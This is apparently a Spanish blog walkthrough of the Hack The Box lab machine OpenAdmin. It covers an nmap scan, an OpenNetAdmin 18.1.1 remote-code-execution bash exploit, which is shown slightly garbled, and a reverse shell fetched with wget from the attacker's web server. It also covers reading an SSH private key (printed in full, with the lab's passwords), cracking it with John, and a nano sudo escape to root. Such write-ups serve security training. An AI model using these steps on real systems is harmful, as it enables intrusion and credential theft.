---
title: "HTB – OpenAdmin"
author: "Oscar Bravo"
header: 
  teaser: "/assets/images/post/2021/OpenAdmin.png"
categories:
  - WriteUp
tags:
  - HTB
  - Maquina
htb:
  status: true
  os: Linux
  developer: dmw0ng
  level: Fácil
  date: 4 enero 2020
  point: 20
---

## Enumeración

Al usar nmap utilizando nmap -p- –open -T5 -v -n 10.10.10.171 y luego con el comando nmap -sCV -p22,80 10.10.10.171 (si quieren guardar el nmap usar -oN <NOMBRE ARCHIVO>) , solo encontramos que está abierto el puerto 22 (SSH) y 80 (web).

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-20 15:01 BST
Nmap scan report for 10.10.10.171
Host is up (0.086s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=4/20%OT=22%CT=1%CU=38520%PV=Y%DS=2%DC=T%G=Y%TM=5E9DAB7
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT ADDRESS
1 103.86 ms 10.10.14.1
2 104.25 ms 10.10.10.171

OS and Service detection performed. Please report any incorrect results at Nmap done: 1 IP address (1 host up) scanned in 41.01 seconds
```

Debido a esto se empieza a busca información con whatweb, en el código fuente de la página web, mientras se ejecuta la dirbuster para buscar paginas ocultas y poder acceder a ellas. Simultaneamente hacemos Fuzzing.

- Music
- Ona
- Artwork
- Marga
- Sierra

Al entrar a cada una de las webs vemos que ona es OpenNetAdmin de versión 18.1.1 buscando en las bases de datos de exploit encontramos un CVE de ejecución remota de código, por lo que se busca el exploit y se encuentra en https://www.exploit-db.com/exploits/47691

```
#!/bin/bash

URL="${1}" while true;do echo -n "$ "; read cmd url --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n done
```

## 1° Shell

Al archivo del exploite le damos permiso 744 y lo ejecutamos de la siguiente manera ./archivo.sh http://10.10.10.171/ona/login.php con esto nos abrirá una terminar con opciones reducidas y difícil de navegar dentro de la misma.

En caso de que querer una shell con opciones, simplemente subimos una shell-reverse para ejecutarla desde el navegador. Para ello ejecutamos python -m SimpleHTTPServer en nuestra terminal y desde la maquina victima bajamos el archivo de la shell revers con wget

Navegando con shell podemos ver que existe 2 usuarios jimmy y joanna, y los archivos de configuración de la web OpenNetAdmin, de acuerdo a la documentación de la web, todo archivo de configuración se encuentra en **local/config**, es acá donde se encuentra una password n1nj4W4rri0R! en database_settings.inc.php, normalmente reutilizan las contraseñas por lo que se intentará ingresar con los usuarios encontrados.

## 2° Shell

El password sirve para acceder vía ssh con el usuario jimmy, pero este usuario no posee la flag de user, por lo que se deberá ver cómo escalar los privilegios al segundo usuario joanna.

Investigando el **/var/www** encontramos que hay una página interna llamada internal es por ello que se revisa la configuración de los sitios en el apache **/etc/apache2**. Al investigar las configuraciones de apache se encontró que hay un sitio que se accede localmente al puerto 52846 /etc/apache2/sites-enabled/internal.conf

Revisando el código fuente de la página internal vemos el archivo main.php encontramos lo siguiente:

```
<?php
session_start();
if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Esto nos dice que nos mostrará el id_rsa del usuario joanna, existe dos formas obtener esta web
### Vía CURL

Para obtener el id_rsa se ejecuta el comando curl http://127.0.0.1:52846/main.php esto mostrar el id_rsa completo.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```
### Vía SSH TUNELING

Al revisar la web internal, nos damos cuenta que en index.php compara el pass con un hash ‘**00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1**′ en sha512, la cual al desencriptarla obtenemos que la clave es Revealed

Con esto generamos el tunel con el siguiente código desde la maquina atacante **ssh -L1234:127.0.0.1:52846 jimmy@10.10.10.171** esto hace el puerto 1234 de la maquina atacante se vincula con el puerto 52846 permitiendo ver la web

Usamos el usuario jimmy y la clave Revealed obtenidas anteriormente nos devuelve el id_rsa

## 3° SHELL (usuario)

Con el id_rsa se debe desencriptar con John the ripper para ello primero obtenemos el hash del id_rsa con **python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash** luego con ese hash ejecutamos John **john id_rsa.hash –wordlist=/usr/share/wordlists/rockyou.txt** y lo que obtenemos es la contraseña de id_rsa **bloodninjas** e ingresando con **ssh –i id_rsa joanna@10.10.10.171** y obtenemos la primera flag.

## 4° SHELL (root)

Dentro del equipo con el usuario joanna revisamos si tiene algún permiso como root, con el comando sudo -l y vemos que si lo tiene con /bin/nano en el archivo /opt/priv, debido a esto usamos GTFObins para revisar si hay escalada de privilegio con nano. Usando ^R^Xreset; sh 1>&0 2>&0 desde nano podemos escapar de él y obtener un sh de root, obteniendo la ultima flag.

![Racso](https://www.hackthebox.com/badge/image/159593)